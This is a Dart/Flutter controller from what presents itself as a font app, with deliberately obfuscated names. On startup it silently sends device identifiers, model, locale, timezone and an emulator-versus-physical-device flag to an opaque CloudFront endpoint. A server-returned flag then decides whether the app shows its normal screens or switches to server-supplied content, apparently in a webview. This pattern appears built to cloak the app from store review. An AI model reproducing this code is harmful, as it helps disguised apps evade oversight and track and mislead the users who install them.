import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';


class FontMasterComeLogic extends GetxController {

  var qldukvyenx = RxBool(false);
  var ourtqzi = RxBool(true);
  var glyf = RxString("");
  var ikepnb = RxBool(false);
  var qrolvbkn = RxBool(true);
  final zwexjrfqkm = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    wpsgoje();
  }


  Future<void> wpsgoje() async {
    ikepnb.value = true;
    qrolvbkn.value = true;
    ourtqzi.value = false;

    zwexjrfqkm.post("https://d3jkzu73c2ed1c.cloudfront.net/ewzscyjinkhdmvglqtpruxafb",data: await thgbezmxf()).then((value) {
      var zwjyqsnl = value.data["zwjyqsnl"] as String;
      var ytcv = value.data["ytcv"] as bool;
      if (ytcv) {
        glyf.value = zwjyqsnl;
        tiyesa();
      } else {
        hvfim();
      }
    }).catchError((e) {
      ourtqzi.value = true;
      qrolvbkn.value = true;
      ikepnb.value = false;
    });
  }

  Future<Map<String, dynamic>> thgbezmxf() async {
    final DeviceInfoPlugin erjol = DeviceInfoPlugin();
    PackageInfo qydgejth_gphvqrd = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var evljbyu = Platform.localeName;
    var lzoame_KWt = currentTimeZone;

    var lzoame_JEOFG = qydgejth_gphvqrd.packageName;
    var lzoame_pz = qydgejth_gphvqrd.version;
    var lzoame_CfwhPkHF = qydgejth_gphvqrd.buildNumber;

    var lzoame_FkbQZ = qydgejth_gphvqrd.appName;
    var lzoame_uzj = "";
    var lzoame_Ie  = "";
    var lzoame_NPSXTc = "";
    var gmlnqfux = "";
    var nobkwrf = "";
    var yvijxnap = "";
    var usjdcel = "";
    var yjnirmf = "";


    var lzoame_YP = "";
    var lzoame_iMAP = false;

    if (GetPlatform.isAndroid) {
      lzoame_YP = "android";
      var sdmhtxvwga = await erjol.androidInfo;

      lzoame_NPSXTc = sdmhtxvwga.brand;

      lzoame_uzj  = sdmhtxvwga.model;
      lzoame_Ie = sdmhtxvwga.id;

      lzoame_iMAP = sdmhtxvwga.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      lzoame_YP = "ios";
      var tpobvrz = await erjol.iosInfo;
      lzoame_NPSXTc = tpobvrz.name;
      lzoame_uzj = tpobvrz.model;

      lzoame_Ie = tpobvrz.identifierForVendor ?? "";
      lzoame_iMAP  = tpobvrz.isPhysicalDevice;
    }
    var res = {
      "lzoame_FkbQZ": lzoame_FkbQZ,
      "lzoame_CfwhPkHF": lzoame_CfwhPkHF,
      "lzoame_pz": lzoame_pz,
      "lzoame_JEOFG": lzoame_JEOFG,
      "lzoame_uzj": lzoame_uzj,
      "lzoame_KWt": lzoame_KWt,
      "lzoame_NPSXTc": lzoame_NPSXTc,
      "lzoame_Ie": lzoame_Ie,
      "evljbyu": evljbyu,
      "lzoame_YP": lzoame_YP,
      "lzoame_iMAP": lzoame_iMAP,
      "gmlnqfux" : gmlnqfux,
      "nobkwrf" : nobkwrf,
      "yvijxnap" : yvijxnap,
      "usjdcel" : usjdcel,
      "yjnirmf" : yjnirmf,

    };
    return res;
  }

  Future<void> hvfim() async {
    Get.offNamed("/master_tab");
  }

  Future<void> tiyesa() async {
    Get.offNamed("/font_detail_run");
  }

}
